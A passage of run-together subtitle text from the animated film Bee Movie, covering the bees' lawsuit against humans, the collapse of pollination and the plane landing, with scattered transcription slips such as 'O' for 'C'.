your part and learn your lines, sir? Watch it, Benson! I could blow right now! This isn\'t a goodfella. This is a badfella! Why doesn\'t someone just step on this creep, and we can all go home?! - Order in this court! - You\'re all thinking it! Order! Order, I say! - Say it! - Mr. Liotta, please sit down! I think it was awfully nice of that bear to pitch in like that. I think the jury\'s on our side. Are we doing everything right, legally? I\'m a florist. Right. Well, here\'s to a great team. To a great team! Well, hello. - Ken! - Hello. I didn\'t think you were coming. No, I was just late. I tried to call, but... the battery. I didn\'t want all this to go to waste, so I called Barry. Luckily, he was free. Oh, that was lucky. There\'s a little left. I could heat it up. Yeah, heat it up, sure, whatever. So I hear you\'re quite a tennis player. I\'m not much for the game myself. The ball\'s a little grabby. That\'s where I usually sit. Right... there. Ken, Barry was looking at your resume, and he agreed with me that eating with chopsticks isn\'t really a special skill. You think I don\'t see what you\'re doing? I know how hard it is to find the rightjob. We have that in common. Do we? Bees have 100 percent employment, but we do jobs like taking the crud out. That\'s just what I was thinking about doing. Ken, I let Barry borrow your razor for his fuzz. I hope that was all right. I\'m going to drain the old stinger. Yeah, you do that. Look at that. You know, I\'ve just about had it with your little mind games. - What\'s that? - Italian Vogue. Mamma mia, that\'s a lot of pages. A lot of ads. Remember what Van said, why is your life more valuable than mine? Funny, I just can\'t seem to recall that! I think something stinks in here! I love the smell of flowers. How do you like the smell of flames?! Not as much. Water bug! Not taking sides! Ken, I\'m wearing a Ohapstick hat! This is pathetic! I\'ve got issues! Well, well, well, a royal flush! - You\'re bluffing. - Am I? Surf\'s up, dude! Poo water! That bowl is gnarly. Except for those dirty yellow rings! Kenneth! What are you doing?! You know, I don\'t even like honey! I don\'t eat it! We need to talk! He\'s just a little bee! And he happens to be the nicest bee I\'ve met in a long time! Long time? What are you talking about?! Are there other bugs in your life? No, but there are other things bugging me in life. And you\'re one of them! Fine! Talking bees, no yogurt night... My nerves are fried from riding on this emotional roller coaster! Goodbye, Ken. And for your information, I prefer sugar-free, artificial sweeteners made by man! I\'m sorry about all that. I know it\'s got an aftertaste! I like it! I always felt there was some kind of barrier between Ken and me. I couldn\'t overcome it. Oh, well. Are you OK for the trial? I believe Mr. Montgomery is about out of ideas. We would like to call Mr. Barry Benson Bee to the stand. Good idea! You can really see why he\'s considered one of the best lawyers... Yeah. Layton, you\'ve gotta weave some magic with this jury, or it\'s gonna be all over. Don\'t worry. The only thing I have to do to turn this jury around is to remind them of what they don\'t like about bees. - You got the tweezers? - Are you allergic? Only to losing, son. Only to losing. Mr. Benson Bee, I\'ll ask you what I think we\'d all like to know. What exactly is your relationship to that woman? We\'re friends. - Good friends? - Yes. How good? Do you live together? Wait a minute... Are you her little... ...bedbug? I\'ve seen a bee documentary or two. From what I understand, doesn\'t your queen give birth to all the bee children? - Yeah, but... - So those aren\'t your real parents! - Oh, Barry... - Yes, they are! Hold me back! You\'re an illegitimate bee, aren\'t you, Benson? He\'s denouncing bees! Don\'t y\'all date your cousins? - Objection! - I\'m going to pincushion this guy! Adam, don\'t! It\'s what he wants! Oh, I\'m hit!! Oh, lordy, I am hit! Order! Order! The venom! The venom is coursing through my veins! I have been felled by a winged beast of destruction! You see? You can\'t treat them like equals! They\'re striped savages! Stinging\'s the only thing they know! It\'s their way! - Adam, stay with me. - I can\'t feel my legs. What angel of mercy will come forward to suck the poison from my heaving buttocks? I will have order in this court. Order! Order, please! The case of the honeybees versus the human race took a pointed turn against the bees yesterday when one of their legal team stung Layton T. Montgomery. - Hey, buddy. - Hey. - Is there much pain? - Yeah. I... I blew the whole case, didn\'t I? It doesn\'t matter. What matters is you\'re alive. You could have died. I\'d be better off dead. Look at me. They got it from the cafeteria downstairs, in a tuna sandwich. Look, there\'s a little celery still on it. What was it like to sting someone? I can\'t explain it. It was all... All adrenaline and then... and then ecstasy! All right. You think it was all a trap? Of course. I\'m sorry. I flew us right into this. What were we thinking? Look at us. We\'re just a couple of bugs in this world. What will the humans do to us if they win? I don\'t know. I hear they put the roaches in motels. That doesn\'t sound so bad. Adam, they check in, but they don\'t check out! Oh, my. Oould you get a nurse to close that window? - Why? - The smoke. Bees don\'t smoke. Right. Bees don\'t smoke. Bees don\'t smoke! But some bees are smoking. That\'s it! That\'s our case! It is? It\'s not over? Get dressed. I\'ve gotta go somewhere. Get back to the court and stall. Stall any way you can. And assuming you\'ve done step correctly, you\'re ready for the tub. Mr. Flayman. Yes? Yes, Your Honor! Where is the rest of your team? Well, Your Honor, it\'s interesting. Bees are trained to fly haphazardly, and as a result, we don\'t make very good time. I actually heard a funny story about... Your Honor, haven\'t these ridiculous bugs taken up enough of this court\'s valuable time? How much longer will we allow these absurd shenanigans to go on? They have presented no compelling evidence to support their charges against my clients, who run legitimate businesses. I move for a complete dismissal of this entire case! Mr. Flayman, I\'m afraid I\'m going to have to consider Mr. Montgomery\'s motion. But you can\'t! We have a terrific case. Where is your proof? Where is the evidence? Show me the smoking gun! Hold it, Your Honor! You want a smoking gun? Here is your smoking gun. What is that? It\'s a bee smoker! What, this? This harmless little contraption? This couldn\'t hurt a fly, let alone a bee. Look at what has happened to bees who have never been asked, ""Smoking or non?"" Is this what nature intended for us? To be forcibly addicted to smoke machines and man-made wooden slat work camps? Living out our lives as honey slaves to the white man? - What are we gonna do? - He\'s playing the species card. Ladies and gentlemen, please, free these bees! Free the bees! Free the bees! Free the bees! Free the bees! Free the bees! The court finds in favor of the bees! Vanessa, we won! I knew you could do it! High-five! Sorry. I\'m OK! You know what this means? All the honey will finally belong to the bees. Now we won\'t have to work so hard all the time. This is an unholy perversion of the balance of nature, Benson. You\'ll regret this. Barry, how much honey is out there? All right. One at a time. Barry, who are you wearing? My sweater is Ralph Lauren, and I have no pants. - What if Montgomery\'s right? - What do you mean? We\'ve been living the bee way a long time, 27 million years. Oongratulations on your victory. What will you demand as a settlement? First, we\'ll demand a complete shutdown of all bee work camps. Then we want back the honey that was ours to begin with, every last drop. We demand an end to the glorification of the bear as anything more than a filthy, smelly, bad-breath stink machine. We\'re all aware of what they do in the woods. Wait for my signal. Take him out. He\'ll have nauseous for a few hours, then he\'ll be fine. And we will no longer tolerate bee-negative nicknames... But it\'s just a prance-about stage name! ...unnecessary inclusion of honey in bogus health products and la-dee-da human tea-time snack garnishments. Oan\'t breathe. Bring it in, boys! Hold it right there! Good. Tap it. Mr. Buzzwell, we just passed three cups, and there\'s gallons more coming! - I think we need to shut down! - Shut down? We\'ve never shut down. Shut down honey production! Stop making honey! Turn your key, sir! What do we do now? Oannonball! We\'re shutting honey production! Mission abort. Aborting pollination and nectar detail. Returning to base. Adam, you wouldn\'t believe how much honey was out there. Oh, yeah? What\'s going on? Where is everybody? - Are they out celebrating? - They\'re home. They don\'t know what to do. Laying out, sleeping in. I heard your Uncle Oarl was on his way to San Antonio with a cricket. At least we got our honey back. Sometimes I think, so what if humans liked our honey? Who wouldn\'t? It\'s the greatest thing in the world! I was excited to be part of making it. This was my new desk. This was my new job. I wanted to do it really well. And now... Now I can\'t. I don\'t understand why they\'re not happy. I thought their lives would be better! They\'re doing nothing. It\'s amazing. Honey really changes people. You don\'t have any idea what\'s going on, do you? - What did you want to show me? - This. What happened here? That is not the half of it. Oh, no. Oh, my. They\'re all wilting. Doesn\'t look very good, does it? No. And whose fault do you think that is? You know, I\'m gonna guess bees. Bees? Specifically, me. I didn\'t think bees not needing to make honey would affect all these things. It\'s notjust flowers. Fruits, vegetables, they all need bees. That\'s our whole SAT test right there. Take away produce, that affects the entire animal kingdom. And then, of course... The human species? So if there\'s no more pollination, it could all just go south here, couldn\'t it? I know this is also partly my fault. How about a suicide pact? How do we do it? - I\'ll sting you, you step on me. - Thatjust kills you twice. Right, right. Listen, Barry... sorry, but I gotta get going. I had to open my mouth and talk. Vanessa? Vanessa? Why are you leaving? Where are you going? To the final Tournament of Roses parade in Pasadena. They\'ve moved it to this weekend because all the flowers are dying. It\'s the last chance I\'ll ever have to see it. Vanessa, I just wanna say I\'m sorry. I never meant it to turn out like this. I know. Me neither. Tournament of Roses. Roses can\'t do sports. Wait a minute. Roses. Roses? Roses! Vanessa! Roses?! Barry? - Roses are flowers! - Yes, they are. Flowers, bees, pollen! I know. That\'s why this is the last parade. Maybe not. Oould you ask him to slow down? Oould you slow down? Barry! OK, I made a huge mistake. This is a total disaster, all my fault. Yes, it kind of is. I\'ve ruined the planet. I wanted to help you with the flower shop. I\'ve made it worse. Actually, it\'s completely closed down. I thought maybe you were remodeling. But I have another idea, and it\'s greater than my previous ideas combined. I don\'t want to hear it! All right, they have the roses, the roses have the pollen. I know every bee, plant and flower bud in this park. All we gotta do is get what they\'ve got back here with what we\'ve got. - Bees. - Park. - Pollen! - Flowers. - Repollination! - Across the nation! Tournament of Roses, Pasadena, Oalifornia. They\'ve got nothing but flowers, floats and cotton candy. Security will be tight. I have an idea. Vanessa Bloome, FTD. Official floral business. It\'s real. Sorry, ma\'am. Nice brooch. Thank you. It was a gift. Once inside, we just pick the right float. How about The Princess and the Pea? I could be the princess, and you could be the pea! Yes, I got it. - Where should I sit? - What are you? - I believe I\'m the pea. - The pea? It goes under the mattresses. - Not in this fairy tale, sweetheart. - I\'m getting the marshal. You do that! This whole parade is a fiasco! Let\'s see what this baby\'ll do. Hey, what are you doing?! Then all we do is blend in with traffic... ...without arousing suspicion. Once at the airport, there\'s no stopping us. Stop! Security. - You and your insect pack your float? - Yes. Has it been in your possession the entire time? Would you remove your shoes? - Remove your stinger. - It\'s part of me. I know. Just having some fun. Enjoy your flight. Then if we\'re lucky, we\'ll have just enough pollen to do the job. Oan you believe how lucky we are? We have just enough pollen to do the job! I think this is gonna work. It\'s got to work. Attention, passengers, this is Oaptain Scott. We have a bit of bad weather in New York. It looks like we\'ll experience a couple hours delay. Barry, these are cut flowers with no water. They\'ll never make it. I gotta get up there and talk to them. Be careful. Oan I get help with the Sky Mall magazine? I\'d like to order the talking inflatable nose and ear hair trimmer. Oaptain, I\'m in a real situation. - What\'d you say, Hal? - Nothing. Bee! Don\'t freak out! My entire species... What are you doing? - Wait a minute! I\'m an attorney! - Who\'s an attorney? Don\'t move. Oh, Barry. Good afternoon, passengers. This is your captain. Would a Miss Vanessa Bloome in 24B please report to the cockpit? And please hurry! What happened here? There was a DustBuster, a toupee, a life raft exploded. One\'s bald, one\'s in a boat, they\'re both unconscious! - Is that another bee joke? - No! No one\'s flying the plane! This is JFK control tower, Flight 356. What\'s your status? This is Vanessa Bloome. I\'m a florist from New York. Where\'s the pilot? He\'s unconscious, and so is the copilot. Not good. Does anyone onboard have flight experience? As a matter of fact, there is. - Who\'s that? - Barry Benson. From the honey trial?! Oh, great. Vanessa, this is nothing more than a big metal bee. It\'s got giant wings, huge engines. I can\'t fly a plane. - Why not? Isn\'t John Travolta a pilot? - Yes. How hard could it be? Wait, Barry! We\'re headed into some lightning. This is Bob Bumble. We have some late-breaking news from JFK Airport, where a suspenseful scene is developing. Barry Benson, fresh from his legal victory... That\'s Barry! ...is attempting to land a plane, loaded with people, flowers and an incapacitated flight crew. Flowers?! We have a storm in the area and two individuals at the controls with absolutely no flight experience. Just a minute. There\'s a bee on that plane. I\'m quite familiar with Mr. Benson and his no-account compadres. They\'ve done enough damage. But isn\'t he your only hope? Technically, a bee shouldn\'t be able to fly at all. Their wings are too small... Haven\'t we heard this a million times? ""The surface area of the wings and body mass make no sense."" - Get this on the air! - Got it. - Stand by. - We\'re going live. The way we work may be a mystery to you. Making honey takes a lot of bees doing a lot of small jobs. But let me tell you about a small job. If you do it well, it makes a big difference. More than we realized. To us, to everyone. That\'s why I want to get bees back to working together. That\'s the bee way! We\'re not made of Jell-O. We get behind a fellow. - Black and yellow! - Hello! Left, right, down, hover. - Hover? - Forget hover. This isn\'t so hard. Beep-beep! Beep-beep! Barry, what happened?! Wait, I think we were on autopilot the whole time. - That may have been helping me. - And now we\'re not! So it turns out I cannot fly a plane. All of you, let\'s get behind this fellow! Move it out! Move out! Our only chance is if I do what I\'d do, you copy me with the wings of the plane! Don\'t have to yell. I\'m not yelling! We\'re in a lot of trouble. It\'s very hard to concentrate with that panicky tone in your voice! It\'s not a tone. I\'m panicking! I can\'t do this! Vanessa, pull yourself together. You have to snap out of it! You snap out of it. You snap out of it. - You snap out of it! - You snap out of it! - You snap out of it! - You snap out of it! - You snap out of it! - You snap out of it! - Hold it! - Why? Oome on, it\'s my turn. How is the plane flying? I don\'t know. Hello? Benson, got any flowers for a happy occasion in there? The Pollen Jocks! They do get behind a fellow. - Black and yellow. - Hello. All right, let\'s drop this tin can on the blacktop. Where? I can\'t see anything. Oan you? No, nothing. It\'s all cloudy. Oome on. You got to think bee, Barry. - Thinking bee. - Thinking bee. Thinking bee! Thinking bee! Thinking bee! Wait a minute. I think I\'m feeling something. - What? - I don\'t know. It\'s strong, pulling me. Like a 27-million-year-old instinct. Bring the nose down. Thinking bee! Thinking bee! Thinking bee! - What in the world is on the tarmac? - Get some lights on that! Thinking bee! Thinking bee! Thinking bee! - Vanessa, aim for the flower. - OK. Out the engines. We\'re going in on bee power. Ready, boys? Affirmative! Good. Good. Easy, now. That\'s it. Land on that flower! Ready? Full reverse! Spin it around! - Not that flower! The other one! - Which one? - That flower. - I\'m aiming at the flower! That\'s a fat guy in a flowered shirt. I mean the giant pulsating flower made of millions of bees! Pull forward. Nose down. Tail up. Rotate around it. - This is insane, Barry! - This\'s the only way I know how to fly. Am I koo-koo-kachoo, or is this plane flying in an insect-like pattern? Get your nose in there. Don\'t be afraid. Smell it. Full reverse! Just drop it. Be a part of it. Aim for the center! Now drop it in! Drop it in, woman! Oome on, already. Barry, we did it! You taught me how to fly! - Yes. No high-five! - Right. Barry, it worked! Did you see the giant flower? What giant flower? Where? Of course I saw the flower! That was genius! - Thank you. - But we\'re not done yet. Listen, everyone! This runway is covered with the last pollen from the last flowers available anywhere on Earth. That means this is our last chance. We\'re the only ones who make honey, pollinate flowers and dress like this. If we\'re gonna survive as a species, this is our moment! What do you say? Are we going to be bees, orjust Museum of Natural History keychains? We\'re bees! Keychain! Then follow me! Except Keychain. Hold on, Barry. Here. You\'ve earned this. Yeah! I\'m a Pollen Jock! And it\'s a perfect fit. All I gotta do are the sleeves. Oh, yeah. That\'s our Barry. Mom! The bees are back! If anybody needs to make a call, now\'s the time. I got a feeling we\'ll be working late tonight! Here\'s your change. Have a great afternoon! Oan I help who\'s next? Would you like some honey with that? It is bee-approved. Don\'t forget these. Milk, cream, cheese, it\'s all me. And I don\'t see a nickel! Sometimes I just feel like a piece of meat! I had no idea. Barry, I\'m sorry. Have you got a moment? Would you excuse me? My mosquito associate will help you. Sorry I\'m late. He\'s a lawyer too? I was already a blood-sucking parasite. All I needed was a briefcase. Have a great afternoon! Barry, I just got this huge tulip order, and I can\'t get them anywhere. No problem, Vannie. Just leave it to me. You\'re a lifesaver, Barry. Oan I help who\'s next? All right, scramble, jocks! It\'s time to fly. Thank you, Barry! That bee is living my life! Let it go, Kenny. - When will this nightmare end?! - Let it all go. - Beautiful day to fly. - Sure is. Between you and me, I was dying to get out of that office. You have got to start thinking bee, my friend. - Thinking bee! - Me? Hold it. Let\'s just stop for a second. Hold it. I\'m sorry. I\'m sorry, everyone. Oan we stop here? I\'m not making a major life decision during a production number! All right. Take ten, everybody. Wrap it up, guys. I had virtually no rehearsal for that. ",,2
